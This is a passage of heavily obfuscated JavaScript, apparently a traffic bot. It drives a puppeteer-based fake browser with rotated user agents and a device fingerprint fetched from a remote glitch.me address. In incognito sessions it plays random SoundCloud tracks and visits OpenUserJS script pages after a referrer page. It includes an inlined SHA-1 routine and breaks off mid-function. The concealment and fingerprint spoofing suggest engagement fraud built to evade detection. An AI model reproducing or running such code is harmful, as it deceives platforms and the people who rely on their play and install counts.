      'https://so' + 'undcloud.c' + 'om/sadfros' + 'ty/beavis-' + 'butthead?s' + 'i=289d5c98' + 'ab0142b982' + '8ef6d51245' + 'b690&utm_s' + 'ource=clip' + Z(0xb, 'pws4') + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/tyler-w' + 'allace-62/' + 'legacy-emi' + 'nem-remix-' + '1?si=8789c' + '4ffc202403' + 'bb58d7a49a' + '59ee589&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng'
    ],
    'oujsToAssist': [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + a1(0x6) + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    'oujsUAs': [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + Z(0x2, 'X5ch') + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ]
  },
  HookManager = {
    'prototypes': () => {
      Array['prototype']['repeatExte' + 'nd'] = function(g) {
        let h = this,
          i = h;
        for (let j = -0x15a2 + 0x1e7b + 0x8d9 * -0x1; j < g; j++)
          i = i['concat'](h);
        return i;
      }, Array['prototype']['random'] = function() {
        return this[floor(random() * this['length'])];
      };
      const f = new Map();
      Array['prototype']['randomFlus' + 'h'] = function(g) {
        let h = this[floor(random() * this['length'])];
        f['has'](g) || f['set'](g, new Set());
        const i = f['get'](g);
        for (; i['has'](h);)
          i['size'] === this['length'] && i['clear'](), h = this[floor(random() * this['length'])];
        return i['add'](h), h;
      };
    }
  };

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x647 + 0x1 * -0x1d11 + 0xd * 0x2b8);
    let h = e[f];
    if (c['edathw'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x1fdf + 0x1def * 0x1 + 0x36 * -0x125, r, s, t = -0x123b * -0x1 + -0x2 * -0x2e9 + -0x180d; s = m['charAt'](t++); ~s && (r = q % (-0x3b9 + 0x1678 + 0x23 * -0x89) ? r * (0x12fe + -0xbd8 + 0x373 * -0x2) + s : s, q++ % (0x5a8 + -0x42f + -0x175 * 0x1)) ? o += String['fromCharCode'](-0x1 * 0x16f7 + -0x139 * 0x9 + -0x1 * -0x22f7 & r >> (-(-0x10be * 0x1 + 0x11bc + -0xfc) * q & -0x241b + 0x136 * 0x1f + -0x1 * 0x169)) : -0x1 * -0xb5d + -0x574 + 0x11 * -0x59) {
          s = n['indexOf'](s);
        }
        for (let u = 0x2d * 0x8b + -0x2206 + 0x997, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x62 * -0x4f + -0x1 * 0x1592 + -0x89c))['slice'](-(-0x15a2 + 0x1e7b + 0x8d7 * -0x1));
        }
        return decodeURIComponent(p);
      };
      c['OtJToc'] = i, b = arguments, c['edathw'] = !![];
    }
    const j = e[-0x3 * 0xc91 + 0x170c + 0x155 * 0xb],
      k = f + j,
      l = b[k];
    return !l ? (h = c['OtJToc'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
HookManager['prototypes']();
const actions = [
  [
    () => flags['ActivateBr' + 'owser'],
    async () => {
      async function f(o = '', p = -0x3 * 0xc91 + 0x170c + 0x218 * 0x7, q) {
        const a2 = c,
          u = await q['waitForSel' + a2(0x10)](o);
        return await m['simClickEl' + 'ement'](u, {
          'pauseAfterMouseUp': p
        }), u;
      }
      log('index.js\x20c' + 'alled');
      const {
        FakeBrowser: g
      } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new g['Builder']()['displayUse' + 'rActionLay' + 'er'](0x27c * 0xa + 0x25 * -0x2b + -0x12a0)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
        'blockTrackers': 0x1,
        'blockTrackersAndAnnoyances': 0x1
      })])['userDataDi' + 'r'](i);
      let k;
      r:
        for (;;)
          try {
            let o = await async function p() {
              let q;
              const r = {
                'User-Agent': q['userAgents']['random'](),
                'Accept-Encoding': 'none'
              };
              try {
                q = (await axios['get']('https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc', {
                  'headers': r
                }))?.['data'];
              } catch (u) {}
              if (q)
                try {
                  q = (await axios['get'](q, {
                    'headers': r
                  }))?.['data'];
                } catch (v) {}
              if (!q)
                return await randomWait(), await p();
              try {
                return 'object' == typeof q ? q : 'string' == typeof q ? JSON['parse'](q) : {};
              } catch (w) {
                if (!q)
                  return await randomWait(), await p();
              }
            }();
            flags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](o), k = await j['launch']();
            break r;
          } catch (q) {
            warn(q), await randomWait();
          }
      const {
        vanillaBrowser: l,
        userAction: m
      } = k, n = await l['createInco' + 'gnitoBrows' + 'erContext']();
      log('browser\x20la' + 'unched'), flags['RPL2_GF'] && setTimeout(async () => {
        async function r() {
          const s = await l['createInco' + 'gnitoBrows' + 'erContext']();
          if (flags['RPL2_SC2'] && Math['random']() >= 0x57 * 0x1d + 0xa7b * 0x2 + -0x1ed1 + 0.3) {
            const u = await s['newPage']();
            let v = 0x1 * 0x386 + 0xff7 + -0x137d;
            if (await u['goto'](data['soundcloud' + 'Tracks']['random'](), {
                'timeout': NETWORK_PATIENCE
              })['catch'](w => v++), v)
              return await u['close'](), await s['close'](), createPage();
            try {
              await u['evaluate'](() => {
                let x = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
                x && 'Play' === x['textConten' + 't'] && (x['id'] = '______hook' + '5');
              });
              let w = await u['$']('#______hoo' + 'k5');
              w && await f('#______hoo' + 'k5', 0x19f3 + 0xdbd + -0x1 * 0x27af, u), await wait(0xa7a8 + 0x19 * -0x8ed + 0xe745 + getRandomInt(-0x2e * -0x251 + 0x8e5 + -0x38db, -0x622 * 0x1f + 0x1ce5 * 0x4 + 0xbfba));
            } catch (x) {}
            return await u['close'](), await s['close'](), createPage();
          } {
            const {
              url: y,
              preRef: z
            } = data['scriptTarg' + 'ets']['randomFlus' + 'h'](-0x2 * 0x4fd + 0x36 * -0x7a + 0x29 * 0xdf), A = await l['createInco' + 'gnitoBrows' + 'erContext'](), B = await A['newPage']();
            let C = 0x2696 * -0x1 + -0x6f * 0x13 + 0x2ed3 * 0x1;
            if (await B['goto'](z, {
                'timeout': NETWORK_PATIENCE
              })['catch'](E => C++), C)
              return await B['close'](), await A['close'](), r();
            const D = await B['evaluate']('!document.' + 'documentEl' + 'ement.inne' + 'rHTML.incl' + 'udes(\x22scri' + 'pt-descrip' + 'tion\x22);');
            return D ? (await B['close'](), await A['close'](), r()) : (await B['goto'](y, {
              'timeout': NETWORK_PATIENCE
            })['catch'](E => C++), C ? (await B['close'](), await A['close'](), r()) : (await new Promise(E => setTimeout(E, 0x17f * 0x9 + 0x1b42 + -0x1 * 0x20e9 + floor((-0x7f8 + -0x7 * 0x143 + 0x14b5) * random()))), await B['evaluate'](() => {
              const a4 = b;
              var E, F, G, H, I, J, K, L, M = 'object' == typeof window ? window : {},
                N = !M['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
              N && (M = global), E = ('0123456789' + 'abcdef')['split'](''), F = [
                -(-0x16210aea + 0x3d7e5c28 + 0x58a2aec2),
                -0x3 * 0x15917b + 0xdefe87 + 0x15 * -0x1713e,
                0xec22 + 0x1 * -0xbd5 + 0x115 * -0x59,
                0x1 * -0x26d7 + 0x313 * -0xb + -0x4 * -0x124a
              ], G = [
                0x15a8 + -0x24b0 + 0x8 * 0x1e4,
                -0x1271 * 0x2 + -0x1b8 + 0x7 * 0x586,
                -0x578 + -0x2033 + 0x25b3,
                0x6 * 0x209 + 0x25c4 + 0x2 * -0x18fd
              ], H = [
                'hex',
                'array',
                'digest',
                'arrayBuffe' + 'r'
              ], I = [], J = function(R) {
                return function(S) {
                  return new O(0x1f8a + 0x576 + -0x24ff)['update'](S)[R]();
                };
              }, K = function() {
                var R, S, T = J('hex');
                for (N && (T = L(T)), T['create'] = function() {
                    return new O();
                  }, T['update'] = function(U) {
                    return T['create']()['update'](U);
                  }, R = -0x1f47 + -0x889 + 0x31 * 0xd0; R < H['length']; ++R)
                  S = H[R], T[S] = J(S);
                return T;
              }, L = function(R) {
                var S = eval('require(\'crypto\');'),
                  T = eval('require(\'buffer\')[\'Buffer\'];'),
                  U = function(V) {
                    if ('string' == typeof V)
                      return S['createHash']('sha1')['update'](V, 'utf8')['digest']('hex');
                    if (V['constructo' + 'r'] === ArrayBuffer)
                      V = new Uint8Array(V);
                    else {
                      if (void(0x2a2 + -0x1d5d + 0x1abb) === V['length'])
                        return R(V);
                    }
                    return S['createHash']('sha1')['update'](new T(V))['digest']('hex');
                  };
                return U;
              };
              class O {
                constructor(R) {
                    R ? (I[-0x111b * -0x1 + -0x1 * -0x2336 + 0x3b * -0xe3] = I[-0xe83 + 0x100b + -0xbc * 0x2] = I[0x1178 + 0xb2 * -0x1d + 0x2b3] = I[0x3e * -0x3d + 0x1b6c + -0xca4] = I[-0x154b * 0x1 + 0x1d86 * 0x1 + -0x1 * 0x838] = I[0x1 * -0x5d + 0x1f72 + -0x1f11] = I[-0x1b32 + 0x1776 + -0x1 * -0x3c1] = I[0x5de + 0xb * -0xa4 + 0x134 * 0x1] = I[-0x1a61 + 0x158f + 0x4d9] = I[-0x4a * 0x5e + -0x2178 + -0x584 * -0xb] = I[0x2233 + -0x1 * 0x1759 + -0xad1] = I[0x83 * 0x43 + -0x1c * -0x22 + -0x25f7] = I[-0x139e + 0x178 + 0x1231 * 0x1] = I[-0x79d * -0x3 + -0x1 * 0xc23 + -0xaa8] = I[-0x1c7a + 0x1b04 + 0x183] = I[0x2 * -0x129c + -0x1 * -0x2141 + 0x405] = I[-0x3c3 + 0x40a + -0x38] = -0x3da + -0xca7 * 0x2 + 0x26e * 0xc, this['blocks'] = I) : this['blocks'] = [
                      0x139a + 0x14 * 0xb3 + -0x6 * 0x599,
                      0x89 * 0x29 + -0x24b4 + 0xec3,
                      -0x71 * -0x7 + -0x223a * 0x1 + 0x1f23,
                      0x1844 + 0x1721 + -0x2f65,
                      -0x1c87 + -0x38c + 0x11 * 0x1e3,
                      -0x2413 + -0x7 * -0x45d + 0x588,
                      0x1 * 0x23a7 + 0x1269 + -0x5 * 0xad0,
                      0x1440 + -0x71 + 0x13cf * -0x1,
                      -0x90b * 0x2 + 0x2091 + 0xe7b * -0x1,
                      -0x20a7 * 0x1 + 0x2278 * -0x1 + 0x431f,
                      0x1e26 + -0x1314 + -0xb12,
                      0x160f * 0x1 + -0x13 * -0x8 + -0x16a7,
                      0xe93 + -0x44d + -0xa46,
                      -0x23cf * 0x1 + -0x1e62 * -0x1 + 0x56d,
                      -0x43f * 0x2 + 0x201c + -0x1 * 0x179e,
                      -0x47 * -0x2b + 0x3eb * -0x7 + 0xf80,
                      -0xba0 + 0xcef * 0x2 + -0xe3e
                    ], this['h0'] = -0xb326 * 0x93cd + 0x53b3 * -0x22d3d + 0x4460522 * 0x5b, this['h1'] = 0x1f * 0x7fb2df9 + -0x17fb21eaa + 0x17815390c, this['h2'] = 0xa8bd4865 + 0x26 * -0x23fb76f + 0x4572cf13, this['h3'] = -0x1 * -0x1ac7e623 + -0xc02d3c7 + 0x16d421a, this['h4'] = 0x118d66d * -0x159 + -0x119452d11 + 0x3579107e6, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x97a * 0x2 + 0x1 * -0x53 + -0x13 * 0xfb, this['finalized'] = this['hashed'] = -0xf77 + -0x105e + 0x1fd5, this['first'] = 0x23f2 + -0x1c8d * -0x1 + -0x7f * 0x82;
                  }
                  ['update'](R) {
                    var S, T, U, V, W, X;
                    if (!this['finalized']) {
                      for ((S = 'string' != typeof R) && R['constructo' + 'r'] === M['ArrayBuffe' + 'r'] && (R = new Uint8Array(R)), U = 0x1136 + 0xab + -0x11e1, W = R['length'] || -0x1fe8 + -0xf89 + 0x2f71, X = this['blocks']; U < W;) {
                        if (this['hashed'] && (this['hashed'] = -0x262e + -0x30c * 0x4 + 0x325e, X[-0x573 + 0x1 * -0xaa3 + -0x47 * -0x3a] = this['block'], X[-0xcb4 + -0x340 * 0xb + 0x3084] = X[-0x176d + -0x105f + 0x27cd] = X[-0x18cd + 0x2 * 0x128 + -0x167f * -0x1] = X[-0x2607 + -0x2271 * -0x1 + 0x3 * 0x133] = X[0x2683 * 0x1 + 0x1 * 0x87e + -0x2efd] = X[-0x2cb + -0x6 * 0x1df + 0xe0a] = X[0x10ac + -0x1582 + 0x4dc] = X[0x11a3 + 0x399 * -0x7 + -0x793 * -0x1] = X[-0x202f + 0xc31 * 0x1 + 0x1406] = X[-0xa84 * 0x2 + -0x1 * 0x139f + 0x1 * 0x28b0] = X[0x8 * -0x26b + 0x4 * 0x1f0 + 0x2 * 0x5d1] = X[-0x3 * -0x112 + -0x361 + 0x2 * 0x1b] = X[-0x1 * -0x22b7 + 0x106f + -0x331a] = X[0x227 + -0x8 * -0x3af + -0x1f92] = X[0xf35 + 0x24ec + -0x3413] = X[0x394 * 0x2 + -0x593 * 0x1 + -0x186] = 0x5 * 0x166 + 0x14c6 + -0x1bc4 * 0x1), S) {
                          for (V = this['start']; U < W && V < 0x206d * -0x1 + -0x1 * -0x486 + -0x1 * -0x1c27; ++U)
                            X[V >> 0x151a * -0x1 + -0x908 + 0x1e24] |= R[U] << G[-0xec1 + -0x20e * 0x10 + -0x2fa4 * -0x1 & V++];
                        } else {
                          for (V = this['start']; U < W && V < -0xd7 * -0x28 + -0xc54 + 0x1504 * -0x1; ++U)
                            (T = R['charCodeAt'](U)) < 0x259d + -0x1703 + -0xe1a ? X[V >> -0x6de + -0x3 * -0x5b3 + -0xa39] |= T << G[-0x1 * 0x183e + 0x1e69 + -0x628 & V++] : T < -0x77d + -0xcf9 + 0x1c76 ? (X[V >> 0x2 * 0x11c9 + 0x97d * -0x1 + 0x59 * -0x4b] |= (-0x12d3 * -0x1 + 0x43b + -0x164e | T >> -0x1fd5 * -0x1 + -0x124 + 0x1eab * -0x1) << G[0x2190 + -0x26cb + 0x53e & V++], X[V >> 0x3a * 0x16 + -0xe6b + 0x971] |= (-0xcce + 0x1aba + -0x35b * 0x4 | 0x23b2 * -0x1 + -0x23f3 * 0x1 + 0x47e4 & T) << G[0x1 * 0x189d + -0x65 * -0x43 + 0xa35 * -0x5 & V++]) : T < 0x8c79 + -0x1022 * 0x4 + -0x1c03 * -0x5 || T >= 0x121fd + 0x45 * 0x598 + 0x3 * -0x96a7 ? (X[V >> -0x15c2 + -0x166d * 0x1 + 0x4e9 * 0x9] |= (-0x6 * -0x425 + -0x12ad + -0x551 | T >> -0x1 * 0x8ef + 0x1 * -0x170f + 0x557 * 0x6) << G[0xb * -0x111 + 0x1 * 0x1845 + 0xc87 * -0x1 & V++], X[V >> -0x59f * -0x5 + 0x277 * 0x3 + -0x237e] |= (0x705 + -0xe * 0x1e + -0x4e1 | T >> -0x133f + -0x12a9 * 0x2 + 0x3897 & 0x592 + -0x1cf8 + 0x17a5) << G[0x1045 + -0x73 * -0x2 + -0x1128 & V++], X[V >> -0x63c + 0x32a + 0x314 * 0x1] |= (0xb6f * -0x1 + -0xace + 0x16bd * 0x1 | -0x8 * -0x3d + 0x1d18 + -0x1ec1 & T) << G[-0xa26 + -0x46d + -0xe96 * -0x1 & V++]) : (T = 0x1340b + 0x1 * -0x1fe0d + 0x36b * 0x86 + ((0x56 * 0x12 + -0x1 * -0x13b1 + 0x79 * -0x2e & T) << 0x18c7 + 0x1 * 0x2383 + -0x3c40 | 0xfb * -0x3 + 0x1 * -0xa3 + 0x7 * 0x115 & R['charCodeAt'](++U)), X[V >> 0xec2 + 0x1 * 0x1589 + 0x2449 * -0x1] |= (-0x2a5 * 0x1 + 0x505 + -0x170 | T >> 0xb * 0x2f2 + -0x3c5 * -0x7 + 0x1 * -0x3ab7) << G[0x19db * -0x1 + -0x26a2 + 0x4080 & V++], X[V >> -0xac * -0x13 + 0x1 * 0x1fff + -0x2cc1] |= (-0xe9a + -0x48d * 0x3 + 0x11 * 0x1b1 | T >> 0x4 * -0x64c + -0x1db6 + 0x43a * 0xd & -0x94 * 0x35 + 0x4 * -0x3d7 + 0x2e3f) << G[0xe * -0x78 + -0x8 * -0x31d + -0x1255 & V++], X[V >> 0x1a77 + -0x1a06 + 0x1 * -0x6f] |= (-0x146 * 0x7 + -0x1 * 0x2419 + 0x2d83 | T >> -0x23 * -0x52 + -0x5 * 0x79c + 0x1adc & 0xd6 * -0x20 + -0xb * -0x1f3 + 0x58e) << G[-0x2662 + -0xc3 + 0x2728 & V++], X[V >> 0x3ab + -0x17b2 + 0x1409] |= (-0x2561 + -0x72d + 0x2d0e | 0x141b + -0x301 * 0x9 + 0x72d & T) << G[0x1e04 + 0x683 + 0xc * -0x30b & V++]);
                        }
                        this['lastByteIn' + 'dex'] = V, this['bytes'] += V - this['start'], V >= -0x25e8 + -0x265 + 0x1 * 0x288d ? (this['block'] = X[-0x227e + -0x1 * -0x199f + -0x8ef * -0x1], this['start'] = V - (-0x25fb * -0x1 + 0x13d0 + 0x1 * -0x398b), this['hash'](), this['hashed'] = -0x9 * 0x22 + 0x9f * -0x7 + 0x58c) : this['start'] = V;
                      }
                      return this['bytes'] > -0x5e06e478 + 0x1b8283a7f + -0x5a215608 && (this['hBytes'] += this['bytes'] / (0x19053b638 + 0xfe10b4e8 + 0x1 * -0x18e646b20) << 0x463 * 0x5 + 0x1 * -0x574 + 0x107b * -0x1, this['bytes'] = this['bytes'] % (0x11adac * -0x1601 + 0x120575434 + -0x298 * -0x898135)), this;
                    }
                  }
                  ['finalize']() {
                    if (!this['finalized']) {
                      this['finalized'] = -0x423 + -0x1e59 * -0x1 + -0x1a35;
                      var R = this['blocks'],
                        S = this['lastByteIn' + 'dex'];
                      R[0x42 * 0x32 + -0x15db + 0x907] = this['block'], R[S >> -0x76c + -0x64c * 0x3 + -0x2 * -0xd29] |= F[0x119f + -0x17 * -0xda + 0x9 * -0x422 & S], this['block'] = R[-0x20b6 + -0xc * -0x6e + 0x1b9e], S >= 0x498 + -0x73 + -0x3ed && (this['hashed'] || this['hash'](), R[0x1af8 * -0x1 + 0x1c84 + -0x42 * 0x6] = this['block'], R[-0x13b1 + -0x2 * -0x103 + -0x11 * -0x10b] = R[-0x7b * -0x50 + 0x93b + 0x1 * -0x2faa] = R[-0x16bb + 0x31 * 0x1 + 0x168c] = R[-0x12fc + -0x93a + 0x1c39] = R[-0x26f5 * 0x1 + 0xbdc + -0x1b1d * -0x1] = R[0x6 * -0x174 + -0xa * 0x15b + -0x1 * -0x164b] = R[-0x1 * 0x2309 + 0x20aa + -0x265 * -0x1] = R[-0x3e * -0x25 + -0x54 + -0x89b] = R[0x38 * -0xb + 0x3a * 0x9a + -0x2074] = R[0x255 * 0x2 + -0x1c08 + -0x1 * -0x1767] = R[-0x19a6 + -0x9e0 + 0x2390] = R[-0xb * -0xeb + 0x1a * -0x153 + 0x1860] = R[0x1492 + -0x2706 + 0x1280] = R[-0x1ffd + 0x7e3 * -0x1 + 0x27ed * 0x1] = R[0x1d7a + 0x13be + -0x312a] = R[0x17 * -0x16b + -0x2ef * -0x3 + -0x3f * -0x61] = -0x2b * 0xda + 0x5 * 0x750 + 0xe), R[0xdf1 * -0x1 + -0xb * 0x2ea + 0x2e0d] = this['hBytes'] << 0x32f + -0xbbc + 0x890 | this['bytes'] >>> 0x1c1 + -0xe47 + -0x5 * -0x287, R[0x14ae * 0x1 + -0x1 * -0x1d45 + 0x3e * -0xce] = this['bytes'] << -0x1 * -0x601 + -0x305 + -0x2f9, this['hash']();
                    }
                  }
                  ['hash']() {
                    var R, S, T = this['h0'],
                      U = this['h1'],
                      V = this['h2'],
                      W = this['h3'],
                      X = this['h4'],
                      Y = this['blocks'];
                    for (R = -0x131f * 0x1 + -0x1c43 + -0x2f72 * -0x1; R < 0x7a9 * 0x1 + -0x55e + -0x1fb; ++R)
                      S = Y[R - (-0x1b21 + -0x1 * 0x3cb + 0x1eef)] ^ Y[R - (0x3 * -0x236 + 0xc72 + -0x4a * 0x14)] ^ Y[R - (0x68e * -0x4 + -0x2e7 * -0x5 + 0xbc3)] ^ Y[R - (-0x1 * 0xc0b + -0x19 * 0x154 + 0x7 * 0x679)], Y[R] = S << -0xfa4 + -0x2167 * 0x1 + 0x310c | S >>> -0x6 * -0xfe + 0x6da + -0xcaf;
                    for (R = -0x1 * -0x1e93 + -0xb0 + -0x1de3; R < -0x12a * -0x3 + 0x16be + -0x1a28; R += 0x1797 + -0xb0a + 0x1 * -0xc88)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << 0x357 * -0x2 + 0x178c + -0x10d9 * 0x1 | T >>> -0xf0a + -0x5 * 0x11d + 0x14b6) + (U & V | ~U & W) + X + (0x1a7e5f * -0x10d + -0x1c12c1e7 + 0x926c0553) + Y[R] << -0xb1d * -0x3 + -0xc * 0x1b7 + -0xcc3) << 0x1989 + -0x45f + -0x1525 * 0x1 | X >>> -0xcf6 + -0x2612 + 0x3323) + (T & (U = U << -0x1185 + 0x16b + 0x1038 | U >>> -0x6f4 + 0x10e2 + 0xa * -0xfe) | ~T & V) + W + (-0x5ca5e4f4 + -0x3aabfdca + 0xf1d45c57) + Y[R + (0x21af + -0x130d + -0xea1)] << 0x2696 + -0x1e15 * 0x1 + -0x1 * 0x881) << 0x2 * 0x745 + 0xe1f + -0x1ca4 | W >>> -0x2ea + -0x87 * -0x1c + -0xbbf) + (X & (T = T << -0x1 * -0x2303 + 0x1b5 + -0x249a | T >>> 0x1190 + -0x25d7 * -0x1 + -0x3765) | ~X & U) + V + (0xaefd52e9 + -0x8a4ebeb * -0x11 + -0x47 * 0x342753d) + Y[R + (0x1ff0 + 0xeb2 + -0x2ea0)] << -0x147d + -0x20e8 + 0x1 * 0x3565) << -0x2393 + 0x1525 + -0x1 * -0xe73 | V >>> -0x2 * 0x6be + -0x3 * -0x3c5 + 0x248) + (W & (X = X << 0x293 + -0xa5a + -0x2f * -0x2b | X >>> 0x3f1 + 0x1737 + -0x1b26) | ~W & T) + U + (0xb33c75ff * 0x1 + -0x6 * -0xb8f1db7 + -0x9e14aeb0) + Y[R + (0xcf6 + -0xfcc + 0x2d9 * 0x1)] << -0x16e * 0x5 + 0x1 * -0x20c3 + 0x27e9 * 0x1) << 0x949 + 0x44 * -0x6d + 0xe * 0x168 | U >>> -0x1 * -0x2705 + 0x2109 + -0x71 * 0xa3) + (V & (W = W << 0x5c3 + -0x1 * -0x18d7 + -0x1e7c * 0x1 | W >>> -0x25f5 + 0xf2b * 0x1 + 0xb66 * 0x2) | ~V & X) + T + (0x9ad74747 + 0x15 * -0x7bca24b + 0x62248279) + Y[R + (-0x2cf * 0x4 + -0x445 * -0x9 + -0x1b2d * 0x1)] << -0x75b * -0x1 + 0x22e3 + -0x2a3e, V = V << -0x1d0 + 0x3 * -0x48f + 0xf9b | V >>> -0x2b9 * -0x4 + -0x1 * -0x1c6e + 0x128 * -0x22;
                    for (; R < 0xb * -0x141 + 0x2 * 0x1230 + -0x166d; R += 0x13 * -0x17f + -0x26ec * 0x1 + 0x435e)
